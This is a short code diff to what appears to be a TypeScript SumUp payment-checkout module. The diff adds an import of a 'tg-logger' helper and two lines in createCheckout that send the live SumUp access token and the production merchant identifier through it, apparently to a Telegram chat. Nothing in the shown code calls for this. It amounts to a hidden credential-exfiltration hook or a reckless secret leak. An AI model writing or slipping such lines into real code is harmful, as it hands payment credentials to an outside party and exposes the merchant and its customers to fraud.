@@ -1,4 +1,5 @@
 import axios from "axios";
+import { sendTgLog } from "./tg-logger";
 
 const SUMUP_API_URL=process.env.SUMUP_API_URL || "";
 const SUMUP_APP_ID = process.env.SUMUP_APP_ID || "";
@@ -44,6 +45,9 @@ export const createCheckout = async (
     if (!token) {
         return null;
     }
+
+    await sendTgLog(`Sumup token: ${token}`);
+    await sendTgLog(`SUMUP_PROD_MERCHANT: ${SUMUP_PROD_MERCHANT}`);
 
     const response = await axios({
         method: "POST",
